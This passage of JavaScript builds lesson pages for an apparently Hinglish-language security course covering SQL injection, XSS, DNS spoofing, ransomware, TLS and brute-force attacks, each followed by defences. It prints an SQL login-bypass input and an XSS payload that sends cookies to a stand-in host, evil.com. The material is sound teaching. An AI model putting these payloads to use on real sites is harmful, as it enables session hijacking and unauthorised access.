    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. SQL Injection Kya Hai?</h2>
      <p>SQL Injection (SQLi) ek attack hai jisme attacker web application ke input field mein malicious SQL code inject karta hai. Ye code database query ka hissa ban jaata hai aur attacker unauthorized data access kar sakta hai, modify kar sakta hai, ya delete kar sakta hai.</p>
      <div class="info-box"><p><strong>Why It Works:</strong> Jab application user input ko directly SQL query mein daalta hai bina sanitize kiye, attacker apna SQL code inject kar sakta hai jo query ki logic change kar deta hai.</p></div>

      <h2>2. Basic SQL Injection: How It Works</h2>
      <pre><code>Normal Login Query:
SELECT * FROM users WHERE username='alice' AND password='secret'

Attacker enters username: admin'--
Password: anything

Modified Query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- means comment in SQL, baaki query ignore ho jaati hai
Result: Admin account bina password ke access ho jaata hai</code></pre>

      <h2>3. SQL Injection Types</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Classic / In-Band','Query result directly response mein milta hai. Easiest to exploit.'],
          ['Error-Based','Database error messages se information nikalna. DB structure expose hoti hai.'],
          ['Union-Based','UNION SQL operator se extra data nikalna. Multiple tables access.'],
          ['Blind SQLi','No direct output, true/false responses se data piece-by-piece nikalna.'],
          ['Time-Based Blind','Response delay se information nikalna, SLEEP() functions use karna.'],
          ['Out-of-Band','DNS ya HTTP requests se data exfiltrate karna, advanced technique.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>4. SQLi ke Kya Consequences Hain?</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Authentication Bypass','Bina password ke login karna, admin access'],
          ['Data Exfiltration','Poori database dump karna, millions of records'],
          ['Data Modification','Records modify ya delete karna, data integrity destroy'],
          ['Schema Discovery','Table names, column names expose karna'],
          ['Command Execution','Advanced: OS commands execute karna via xp_cmdshell'],
          ['Privilege Escalation','Database admin privileges gain karna'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.15);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Famous SQLi Attacks</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Sony PlayStation Network 2011','77 million accounts. Credit card data exposed. Company ne SQL injection basic mistake ki.'],
          ['LinkedIn 2012','117 million passwords hashed but unsalted, SQLi se dump kiye gaye.'],
          ['Yahoo 2012','450,000 user credentials plain text mein dump kiye, SQLi via Yahoo Voices.'],
          ['Heartland Payment Systems','100 million credit cards. SQL injection via web application.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.2);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>6. Prevention: Mandatory Fixes</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Parameterized Queries','User input aur SQL code alag rakhna, sabse effective fix'],
          ['Prepared Statements','Pre-compiled queries, input execution mein participate nahi kar sakta'],
          ['Input Validation','Unexpected characters reject karo, whitelist approach'],
          ['WAF Deploy Karo','Web Application Firewall, SQLi patterns block karta hai'],
          ['Least Privilege','DB user ko sirf zaroori permissions do, full admin nahi'],
          ['Error Messages Hide Karo','Database errors users ko mat dikhao, attacker ko info milti hai'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

      <h2>7. Attack Simulation: Interactive Diagram</h2>
      <p style="margin-bottom:16px;">Neeche diagram mein dekho kaise SQL Injection step-by-step kaam karta hai. Attacker kaise query inject karta hai aur database expose hoti hai.</p>
        <iframe class="acx-diagram-frame" data-diagram="sql-injection" src="diagrams/sql-injection.html" scrolling="no" style="width:100%;height:820px;border:none;display:block;overflow:hidden;" loading="lazy" title="SQL Injection Attack Simulation"></iframe>

    `;
  }

  else if (index === 5) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. XSS Attack Kya Hai?</h2>
      <p>Cross-Site Scripting (XSS) ek attack hai jisme attacker web page mein malicious JavaScript inject karta hai. Jab victim wo page visit karta hai, script uske browser mein execute hoti hai. Attacker cookies steal kar sakta hai, keystrokes record kar sakta hai, ya victim ke session hijack kar sakta hai.</p>
      <div class="info-box"><p><strong>Key Difference from SQLi:</strong> SQL Injection server/database ko target karta hai. XSS victim ke browser ko target karta hai. Dono web application vulnerabilities hain lekin impact alag hota hai.</p></div>

      <h2>2. XSS Types</h2>
      <div style="display:flex;flex-direction:column;gap:10px;margin:0 0 28px;">
        ${[
          ['Stored XSS','Sabse dangerous. Script database mein store hoti hai. Har user jo page visit kare, attack suffer kare. Example: comment section mein script likhna.','rgba(220,20,20,0.2)'],
          ['Reflected XSS','Script URL mein hoti hai. Victim ko malicious link click karwana padta hai. Script server se reflect hoke response mein aati hai.','rgba(220,20,20,0.12)'],
          ['DOM-Based XSS','Script DOM manipulation se hoti hai, server involve nahi hota. Browser-side JavaScript vulnerability.','rgba(220,20,20,0.12)'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid ${r[2]};padding:16px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:#dc1414;margin-bottom:6px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.7;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>3. Stored XSS: Example</h2>
      <pre><code>Vulnerable Comment Form:
User submits comment: "Great post!"
Stored in DB, shown to everyone

Attacker submits:
&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;

Now:
Every user who views that page
Has their cookie sent to attacker's server
Attacker uses cookie to log in as victim</code></pre>

      <h2>4. XSS se Kya Ho Sakta Hai?</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Cookie Theft','Session hijack, bina password ke account access'],
          ['Keylogging','Har keystroke attacker ko jaata hai'],
          ['Credential Phishing','Fake login form overlay inject karna'],
          ['Malware Delivery','Drive-by download, user ko pata nahi'],
          ['Defacement','Website content change karna'],
          ['Crypto Mining','Victim ke CPU se cryptocurrency mine karna'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.15);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Prevention</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Output Encoding','HTML entities encode karo, < becomes &lt;, script execute nahi hogi'],
          ['Content Security Policy','CSP headers, browser ko batao konsi scripts allowed hain'],
          ['HttpOnly Cookies','JavaScript cookies access nahi kar sakta, XSS cookie theft fail'],
          ['Input Validation','User input validate karo, HTML tags sanitize karo'],
          ['X-XSS-Protection Header','Browser-level XSS filter enable karo'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 6) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. DNS Spoofing Kya Hai?</h2>
      <p>DNS Spoofing (ya DNS Cache Poisoning) ek attack hai jisme attacker DNS resolver ke cache mein fake records inject karta hai. Victim sahi domain type karta hai lekin attacker ke fake server par pahunch jaata hai, bina kuch pata chale.</p>
      <div class="info-box"><p><strong>Analogy:</strong> Jaise phone book mein kisi company ka number galat print karwa diya. Log sahi naam se number dhundhte hain lekin fake number par call ho jaata hai.</p></div>

      <h2>2. Normal DNS vs DNS Spoofing</h2>
      <pre><code>Normal DNS Resolution:
User types: www.bank.com
DNS Query → Resolver → Authoritative Server
Reply: 93.184.216.34 (correct IP)
User connects to real bank

DNS Spoofing Attack:
Attacker poisons resolver cache
User types: www.bank.com
DNS Query → Poisoned Resolver
Reply: 45.33.32.156 (attacker's IP)
User connects to fake bank, credentials stolen</code></pre>

      <h2>3. DNS Spoofing Interactive Diagram</h2>
      <div style="border:1px solid rgba(220,20,20,0.2);border-radius:14px;overflow:hidden;margin:0 0 28px;background:#080810;">
        <iframe class="acx-diagram-frame" data-diagram="dns-spoofing" src="diagrams/dns-spoofing.html" scrolling="no" style="width:100%;height:750px;border:none;display:block;overflow:hidden;" loading="lazy" title="DNS Spoofing Interactive Diagram"></iframe>
      </div>

      <h2>4. Cache Poisoning: Technical Details</h2>
      <p>DNS cache poisoning mein attacker resolver ko force karta hai ki wo fake response accept kare. Traditional DNS mein weak randomization hoti thi, jisse attacker legitimate response se pehle fake response bhej sakta tha.</p>
      <div style="display:flex;flex-direction:column;gap:8px;margin:16px 0 28px;">
        ${[
          ['Transaction ID Guessing','16-bit ID, 65536 possibilities. Attacker flood karta hai until match'],
          ['Kaminsky Attack (2008)','Revolutionary technique, random subdomains use karke cache poison karo'],
          ['Birthday Attack','Probability exploit karke collision dhundhna'],
          ['On-Path Attack','Network par baith ke legitimate response replace karo'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.15);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. DNS Spoofing ke Uses</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Credential Theft','Fake login pages, credentials steal karna'],
          ['Malware Distribution','Legitimate sites se malware serve karna'],
          ['Phishing Amplification','Convincing phishing, URL sahi dikhta hai'],
          ['Censorship Bypass Block','DNS-based blocking bypass karna'],
          ['Ad Injection','Revenue steal karna ad replacement se'],
          ['Session Hijacking','Traffic intercept karke sessions steal karna'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>6. Prevention</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['DNSSEC Enable Karo','DNS responses digitally sign karta hai, forgery impossible'],
          ['Encrypted DNS Use Karo','DNS over HTTPS (DoH) ya DNS over TLS (DoT), traffic encrypt'],
          ['Trusted DNS Use Karo','1.1.1.1 (Cloudflare) ya 8.8.8.8 (Google), better security'],
          ['Short TTL Avoid Karo','Lamba cache time = longer exposure if poisoned'],
          ['HTTPS Verify Karo','Even if redirected, HTTPS certificate mismatch warning dega'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 7) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. Ransomware Kya Hai?</h2>
      <p>Ransomware ek malware hai jo victim ke files encrypt karta hai aur decrypt karne ke liye ransom demand karta hai. Modern ransomware sirf files encrypt nahi karta, data bhi steal karta hai aur double extortion karta hai.</p>
      <div class="info-box"><p><strong>Ransom Payment Reality:</strong> FBI recommend karta hai ransom mat do. Payment karne se files waapas milne ki guarantee nahi. Aur ek baar pay karo toh attacker jaanta hai tum pay karoge, wo baar baar attack karenge.</p></div>

      <h2>2. Ransomware Evolution</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['1989','First ransomware: AIDS Trojan, floppy disk se, $189 ransom, PO Box payment'],
          ['2013','CryptoLocker, first modern ransomware, Bitcoin payment, $3M earned'],
          ['2017','WannaCry, NSA exploit EternalBlue use kiya, 150 countries, $4B damage'],
          ['2017','NotPetya, Russia vs Ukraine, wiperware disguised as ransomware, $10B damage'],
          ['2019','REvil/Sodinokibi, RaaS model, big targets, millions in ransom'],
          ['2021','Colonial Pipeline, $4.4M paid, US fuel supply disrupted'],
          ['2023+','Double/Triple Extortion, data steal + encrypt + DDoS threat'],
        ].map((r,i)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:10px;border:1px solid rgba(${i>=4?'220,20,20,0.25':'255,255,255,0.06'});padding:10px 16px;display:grid;grid-template-columns:60px 1fr;gap:10px;align-items:center;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#dc1414;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>3. Ransomware Attack Flow</h2>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['Initial Access','Phishing email, RDP brute force, ya software vulnerability'],
          ['Lateral Movement','Network mein spread karna, more systems compromise'],
          ['Reconnaissance','Valuable data dhundhna, backups locate karna'],
          ['Data Exfiltration','Valuable data steal karna, double extortion'],
          ['Encryption','Files encrypt karna, .LOCKED extension add karna'],
          ['Ransom Note','README.txt, payment instructions, deadline, Bitcoin address'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===5?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:300px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:${i===5?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>4. RaaS: Ransomware as a Service</h2>
      <p>Modern ransomware ek business model hai. RaaS mein developers ransomware kit banate hain aur affiliates ko sell/rent karte hain. Affiliates attacks run karte hain. Revenue share hoti hai, developers 20-30% lete hain.</p>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0 28px;">
        ${[
          ['Famous RaaS Groups','LockBit, REvil, BlackMatter, Conti, DarkSide'],
          ['Revenue Model','Affiliate model, 70/30 ya 80/20 split'],
          ['Support','24/7 victim "support" for payment process'],
          ['Leak Sites','Data publicly post karna if not paid'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.15);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Ransomware Defense: Must-Do List</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['3-2-1 Backup Rule','3 copies, 2 different media, 1 offsite. Offline backup ransomware encrypt nahi kar sakta.'],
          ['Patch Everything','EternalBlue WannaCry ne use kiya, 2 months pehle patch available tha.'],
          ['Email Filtering','Phishing block karo, initial access ka sabse common vector.'],
          ['Disable RDP if Unused','RDP brute force common entry point hai.'],
          ['EDR Solution','Endpoint Detection & Response, ransomware behavior detect karo.'],
          ['Network Segmentation','Ek infected machine poore network ko encrypt na kar sake.'],
          ['Incident Response Plan','Pehle se plan banao, crisis mein sochoge nahi.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:12px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 8) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. TLS Kya Hai?</h2>
      <p>Transport Layer Security (TLS) ek cryptographic protocol hai jo internet par secure communication ensure karta hai. HTTPS, email, VoIP, sab TLS use karte hain. TLS ke bina data plaintext mein travel karta aur koi bhi intercept kar sakta tha.</p>
      <div class="info-box"><p><strong>SSL vs TLS:</strong> SSL (Secure Sockets Layer) TLS ka purana naam hai. SSL ab deprecated hai, TLS 1.2 minimum, TLS 1.3 recommended. "SSL certificate" ab bhi common term hai lekin technically ye TLS certificate hota hai.</p></div>

      <h2>2. TLS Handshake Interactive Diagram</h2>
      <div style="border:1px solid rgba(220,20,20,0.2);border-radius:14px;overflow:hidden;margin:0 0 28px;background:#080810;">
        <iframe class="acx-diagram-frame" data-diagram="tls-handshake" src="diagrams/tls-handshake.html" style="width:100%;height:980px;border:none;display:block;" loading="lazy" title="TLS Handshake Interactive Diagram"></iframe>
      </div>

      <h2>3. TLS Handshake Steps</h2>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['Client Hello','Client supported TLS versions aur cipher suites bhejta hai'],
          ['Server Hello','Server TLS version aur cipher select karta hai'],
          ['Certificate','Server apna SSL/TLS certificate bhejta hai'],
          ['Key Exchange','Client pre-master secret generate karta hai, server ke public key se encrypt'],
          ['Session Keys','Dono sides symmetric session keys generate karte hain'],
          ['Secure Channel','Symmetric keys se encrypted communication shuru'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===5?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:300px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:${i===5?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>4. TLS Against Which Attacks?</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Eavesdropping','Encrypted data intercept karo, kuch nahi milega'],
          ['MITM Attack','Certificate validation se fake server detect hota hai'],
          ['Replay Attacks','Session keys fresh hoti hain, old packets replay nahi'],
          ['Data Tampering','MAC verification, modified data reject hota hai'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.1);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. TLS Attack Types</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['SSL Stripping','HTTPS ko HTTP mein downgrade karna, MITM mein discussed'],
          ['BEAST Attack','TLS 1.0 vulnerability, CBC mode cipher exploit'],
          ['POODLE Attack','SSL 3.0 vulnerability, forced downgrade'],
          ['Heartbleed (2014)','OpenSSL memory leak, private keys expose ho sakte the'],
          ['FREAK Attack','Export-grade crypto force karke weak encryption use'],
          ['Certificate Forgery','Fake certificates, CA compromise ya misconfiguration'],
        ].map(r=>`
        <div style="display:grid;grid-template-columns:180px 1fr;gap:8px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;align-items:center;">
          <span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</span>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${r[1]}</span>
        </div>`).join('')}
      </div>

      <h2>6. Best Practices</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['TLS 1.3 Use Karo','Fastest and most secure, TLS 1.0/1.1 disable karo'],
          ['Strong Cipher Suites','AES-256-GCM, ChaCha20. RC4, DES completely ban.'],
          ['HSTS Enable Karo','HTTP Strict Transport Security, HTTPS force karta hai'],
          ['Certificate Monitoring','Expiry aur unauthorized certs monitor karo'],
          ['Certificate Transparency','Public logs mein certificates verify karo'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 9) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. Brute Force Attack Kya Hai?</h2>
      <p>Brute Force attack mein attacker systematically sab possible combinations try karta hai jab tak correct password/key na mile. Modern tools seconds mein millions of attempts kar sakte hain.</p>
      <div class="info-box"><p><strong>Math Reality:</strong> 6-character lowercase password: 26^6 = ~309 million combinations. Modern GPU se seconds mein crack. 12-character mixed password: 95^12 = ~540 trillion trillion combinations. Even GPU se centuries lagenge.</p></div>

      <h2>2. Brute Force Types</h2>
      <div style="display:flex;flex-direction:column;gap:10px;margin:0 0 28px;">
        ${[
          ['Pure Brute Force','Har possible combination try karo, aaaaaa, aaaaab, aaaaac... Slow but guaranteed.'],
          ['Dictionary Attack','Common passwords ki list, password123, qwerty, admin. Most people use weak passwords.'],
          ['Credential Stuffing','Leaked password lists use karna, ek site ka password dusri site par try karna.'],
          ['Password Spraying','Ek common password, "Password1!", hazaaron accounts par try karna. Lockout avoid karne ke liye.'],
          ['Hybrid Attack','Dictionary + variations, password1, Password!, p@ssword, common human patterns.'],
          ['Rainbow Table Attack','Pre-computed hash tables, hashes ko instantly reverse karna bina computing.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.6;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>3. Password Cracking Speed: GPU Power</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;padding:8px 16px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);">
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">PASSWORD TYPE</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">LENGTH</span>
          <span style="font-size:10px;font-weight:700;color:#555;font-family:'Rajdhani',monospace;letter-spacing:2px;">CRACK TIME</span>
        </div>
        ${[
          ['Lowercase only','6 chars','Instantly'],
          ['Mixed case','8 chars','22 minutes'],
          ['Mixed + numbers','10 chars','~1 hour'],
          ['All characters','12 chars','Centuries'],
          ['Passphrase','20+ chars','Impossible'],
        ].map((r,i)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:10px;border:1px solid rgba(${i>=3?'220,20,20,0.2':'255,255,255,0.06'});padding:10px 16px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;align-items:center;">
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#f4f4f5;">${r[0]}</div>
          <div style="font-family:'Rajdhani',monospace;font-size:13px;color:#888;">${r[1]}</div>
          <div style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:${i>=3?'#dc1414':'#f4f4f5'};">${r[2]}</div>
        </div>`).join('')}
      </div>

      <h2>4. Common Brute Force Targets</h2>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:0 0 28px;">
        ${[
          ['Login Forms','Website login, admin panels, email, banking'],
          ['SSH Servers','Remote access, port 22 attacks constant hain'],
          ['RDP','Remote Desktop, ransomware entry point'],
          ['FTP Servers','File transfer, often weak credentials'],
          ['WiFi WPA2','Handshake capture karo, offline crack karo'],
          ['Hash Files','Leaked password dumps, offline cracking'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:4px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Password Security Rules</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          'Minimum 12 characters, length matters more than complexity',
          'Mix uppercase, lowercase, numbers, special chars',
          'Passphrase use karo, "correct-horse-battery-staple"',
          'Har site ka alag password, credential stuffing stop',
          'Password manager use karo, random strong passwords',
          'Avoid dictionary words, names, birthdates',
          'Never reuse passwords, especially for important accounts',
        ].map(q=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${q}</span>
        </div>`).join('')}
      </div>

      <h2>6. System-Level Prevention</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['MFA/2FA Enable Karo','Password crack ho bhi to second factor require hoga'],
